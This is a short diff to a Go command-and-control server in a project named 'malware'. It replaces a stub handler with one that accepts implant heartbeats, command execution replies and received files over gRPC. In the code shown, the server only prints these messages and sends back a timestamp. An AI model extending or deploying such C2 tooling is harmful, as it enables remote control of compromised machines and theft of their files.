@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"malware/common"
 	"net"
+	"time"
 
 	pb "malware/common/messages"
 
@@ -15,9 +16,18 @@ type c2 struct {
 	port int
 }
 
-func (c2 *c2) Exec(context.Context, *pb.ExecRequest) (*pb.ExecReply, error) {
-	fmt.Println("Hi")
-	return &pb.ExecReply{Reply: "hi"}, nil
+func (c2 *c2) CheckCommandQueue(_ context.Context, req *pb.CheckCmdRequest) (*pb.CheckCmdReply, error) {
+	switch u := req.Message.(type) {
+	case *pb.CheckCmdRequest_Heartbeat:
+	case *pb.CheckCmdRequest_Exec:
+		fmt.Println("Exec reply", u)
+	case *pb.CheckCmdRequest_File:
+		fmt.Println("Received file", u)
+	default:
+		common.Panic("Didn't receive a valid message", req, u)
+	}
+
+	return &pb.CheckCmdReply{Message: &pb.CheckCmdReply_Heartbeat{Heartbeat: time.Now().Unix()}}, nil
 }
 
 func main() {
@@ -32,7 +42,7 @@ func main() {
 	defer listener.Close()
 
 	server := grpc.NewServer()
-	pb.RegisterImplantServer(server, c2)
+	pb.RegisterMalwareServer(server, c2)
 	server.Serve(listener)
 	fmt.Println("Listening on s", server.GetServiceInfo())
 
